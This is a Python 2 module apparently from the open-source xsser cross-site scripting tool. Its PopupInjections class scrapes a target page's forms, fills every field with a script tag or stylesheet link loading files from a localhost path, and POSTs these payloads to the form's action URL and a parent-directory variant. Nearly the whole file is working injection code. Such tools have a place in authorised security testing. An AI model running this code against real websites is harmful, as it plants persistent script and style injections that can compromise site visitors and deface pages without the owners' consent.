#!/usr/bin/python
# -*- coding: iso-8859-15 -*-
"""
$Id$

This file is part of the xsser project, http://xsser.sourceforge.net.

Copyright (c) 2011/2012/2013 psy <root@lordepsylon.net> - <epsylon@riseup.net>

xsser is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 3 of the License.

xsser is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along 
with xsser; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
try:
    from BeautifulSoup import BeautifulSoup
except:
    from bs4 import BeautifulSoup

import urllib, urlparse, os.path

class PopupInjections():
    def addPopup(self, url): # (self, url, payload)
        self.url = url
        source = urllib.urlopen(self.url)
        soup   = BeautifulSoup(source.read())
        print ">>> Reading Source...\n\n"
        for form in soup.find_all("form"):
            inputs_submit = []
            inputs_field  = []
            #form_action.append(form.get("action"))   # Get URI to will send
            print ">>> Searching field vulnerabilities...\n\n"
            for inputs in form.find_all("input"):
                if inputs.get("type") == "submit":
                    inputs_submit.append(inputs.get("name"))
                    inputs_submit.append(inputs.get("value"))
                elif inputs.get("type") != "submit":
                    inputs_field.append(inputs.get("name"))
                else:
                    print "Not found any field vulnerability :(\n\n"
            for textarea in form.find_all("textarea"):
                inputs_field.append(textarea.get("textarea"))
			
            vectorJS = {}
            path_archive1 = "core/css.js"
            if os.path.isfile(path_archive1) == True:
                for field in inputs_field:
                    vectorJS[field] = """<script src="http://localhost/GSoC/css.js"></script>"""
                vectorJS[inputs_submit[0]] = inputs_submit[1]
                send_vector = urllib.urlencode(vectorJS)
                print ">>> Vector .js attack...!\n\n"
                print send_vector
                print "-"*75
                parts = urlparse.urlsplit(self.url)
                a = ''
                for i in parts.path.split("/")[0:-1]:
                    a += i + "/"
                send_url = parts.scheme + "://" + parts.netloc + a + form.get("action").split("../")[-1]
                b = ''
                for j in parts.path.split("/")[0:-2]:
                    b += j + "/"
                send_url2 = parts.scheme + "://" + parts.netloc + b + form.get("action").split("../")[-1]
                urllib.urlopen(send_url, send_vector)
                urllib.urlopen(send_url2, send_vector)  # Because some pages used '../send.php' to send a request
                vectorCSS = {}
                path_archive2 = "core/injection.css"
                if os.path.isfile(path_archive2) == True:
                    for field in inputs_field:
                        vectorCSS[field] = """<link rel="stylesheet" href="http://localhost/GSoC/injection.css"/>"""
                    vectorCSS[inputs_submit[0]] = inputs_submit[1]
                    
                send_vector2 = urllib.urlencode(vectorCSS)
                print ">>> Vector .css attack...!\n\n"
                print send_vector2
                print "-"*75
                urllib.urlopen(send_url, send_vector2)
                urllib.urlopen(send_url2, send_vector2)

if __name__ == '__main__':
    PopupInjections = PopupInjections()
